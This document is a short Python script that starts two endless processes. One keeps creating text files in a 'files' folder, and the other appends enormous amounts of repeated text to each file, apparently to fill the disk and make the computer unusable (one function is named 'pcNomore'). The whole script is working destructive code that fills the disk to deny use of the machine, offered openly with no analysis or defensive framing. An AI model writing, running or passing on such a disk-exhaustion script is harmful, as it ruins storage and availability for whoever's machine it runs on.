import os
from multiprocessing import Process

path = 'files'
if not os.path.exists(path):
    os.mkdir(path)
cont = True
fileNumA = 1
fileNumB = 1
count = 0
text = "Peen"

file_list = []

def fileCreate():
    global file
    global fileNumA
    global file_list
    global count
    while cont == True:
        file = path + '/LBOZO' + str(fileNumA) + '.txt'
        with open(file, 'w') as fp:
            fp.write("Peen")
            fileNumA = fileNumA + 1
            file_list.append(file)



def pcNomore():
    global file
    global fileNumB
    global file_list
    global count
    while cont == True:
        file = path + '/LBOZO' + str(fileNumB) + '.txt'
        with open(file, 'a') as fp:
            fileNumB = fileNumB + 1
            for x in range(1000000):
                fp.write(text * 100000)



if __name__ == '__main__':
    p1 = Process(target=fileCreate)
    p1.start()
    p2 = Process(target=pcNomore)
    p2.start()
